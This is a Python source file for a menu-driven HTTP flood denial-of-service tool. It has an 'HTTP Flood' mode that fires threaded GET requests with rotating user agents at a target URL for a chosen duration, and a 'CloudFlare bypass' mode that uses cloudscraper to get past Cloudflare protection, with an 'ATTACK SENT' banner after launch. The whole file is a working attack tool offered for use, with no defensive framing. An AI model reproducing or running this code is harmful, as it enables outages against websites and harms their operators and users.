import threading
import datetime
import threading
import requests
import os
import random
import time
import cloudscraper

useragent = open("ua.txt").read().splitlines()

ijo = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
          {ijo}
                     ╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗            
                     ║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝            
                     ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩   {clear}
           {ijo}╔═══════════════════════════════════{clear}
           {ijo}║{clear}  {ijo}-{clear} [01]     {ijo}|{clear} HTTP Flood         
           {ijo}║{clear}  {ijo}-{clear} [02]      {ijo}|{clear} CloudFlare bypass
           {ijo}╚═══════════════════════════════════{clear}

""")              
    
def Main():
    while True:
        banner()
        select = input(f"""
╔═══[{ijo}root{clear}@{ijo}Layer7{clear}]
╚══{ijo}>{clear} """)
         
        if select in['1', '01']:
            url = input("Enter Target Url : ")
            threads = int(input("Enter Threads : "))
            secs = int(input("Enter Duration : "))
            
            def http_attack(url, secs):
                end_time = time.time() + secs
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.get(url, headers=headers, timeout=5)
                except:
                    pass
            
            def th(url, thread, secs):
                for _ in range(thread):
                    t = threading.Thread(target=http_attack, args=(url, secs))
                    t.start()
            
            th(url, threads, secs)
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
                    {ijo}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {ijo}╔══════════════════════════════════{clear}
      {ijo}║{clear} METHODS{ijo}:{clear} {ijo}[{clear}HTTP{ijo}]{clear} 
      {ijo}║{clear} URL{ijo}:{clear} {ijo}[{clear}{url}{ijo}]{clear}                
      {ijo}║{clear} THREADS{ijo}:{clear} {ijo}[{clear}{threads}{ijo}]{clear}                   
      {ijo}║{clear} TIME{ijo}:{clear} {ijo}[{clear}{secs}{ijo}]{clear}                     
      {ijo}╚══════════════════════════════════{clear}       
""")
            time.sleep(secs)


        elif select in['2', '02']:
            url = input("Enter Target Url : ")
            threads = int(input("Enter Threads : "))
            secs = int(input("Enter Duration : "))
            
            def cloudflare(url, end_time):
                end_time = time.time() + secs
                scraper = cloudscraper.create_scraper()
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        scraper.get(url, headers=headers, timeout=5)
                        scraper.head(url, headers=headers, timeout=5)
                except:
                    pass
            
            def th(url, threads, secs):
                for _ in range(threads):
                    t = threading.Thread(target=cloudflare, args=(url, secs))
                    t.start()
            
            th(url, threads, secs)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
                {ijo}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                {clear}
        {ijo}╔══════════════════════════════════{clear}
        {ijo}║{clear} METHODS{ijo}:{clear} {ijo}[{clear}CloudFlare Bypass{ijo}]{clear} 
        {ijo}║{clear} URL{ijo}:{clear} {ijo}[{clear}{url}{ijo}]{clear}                
        {ijo}║{clear} THREADS{ijo}:{clear} {ijo}[{clear}{threads}{ijo}]{clear}                   
        {ijo}║{clear} TIME{ijo}:{clear} {ijo}[{clear}{secs}{ijo}]{clear}                     
        {ijo}╚══════════════════════════════════{clear}       
            """)
            time.sleep(secs)













